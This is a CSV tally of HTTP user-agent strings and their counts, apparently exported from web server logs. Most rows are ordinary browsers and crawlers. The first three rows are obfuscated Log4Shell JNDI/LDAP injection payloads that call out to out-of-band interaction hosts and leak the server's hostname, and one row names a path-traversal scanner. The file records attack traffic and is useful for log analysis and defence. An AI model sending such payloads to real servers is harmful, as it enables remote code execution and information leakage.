http_user_agent,count
${jndi:ldap://${:-285}${:-139}.${hostName}.useragent.cvj970dqpia6vils81g0oidp3py9z8c3e.oast.online},1
${jndi:ldap://${:-568}${:-406}.${hostName}.useragent.cvi8tvlqpiaade48ccr06gfcmd63jomfq.oast.fun},1
${jndi:ldap://${:-568}${:-406}.${hostName}.useragent.cvi8tvlqpiaade48ccr08t97x8qyksuk8.oast.fun},1
'Mozilla/5.0,8
'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)',38
'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/networks/ip-networks/deepfield/genome/)',42
'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)',36
Go-http-client/1.1,3716
Linux Gnu (cow),3
"Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)",6
Mozilla Firefox,11
Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90),2
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0),164
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1),2
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .            NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3),4
Mozilla/5.0,16
Mozilla/5.0 (Android 12.1; Mobile; rv:55.0) Gecko/55.0 Firefox/55.0,1
Mozilla/5.0 (Android 4.1.1; Mobile; rv:34.0) Gecko/34.0 Firefox/34.0,3
"Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",2
Mozilla/5.0 (CentOS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0,2
Mozilla/5.0 (Knoppix; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0,1
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",16
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",15
"Mozilla/5.0 (Linux; Android 10; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",1
"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",2
"Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",3
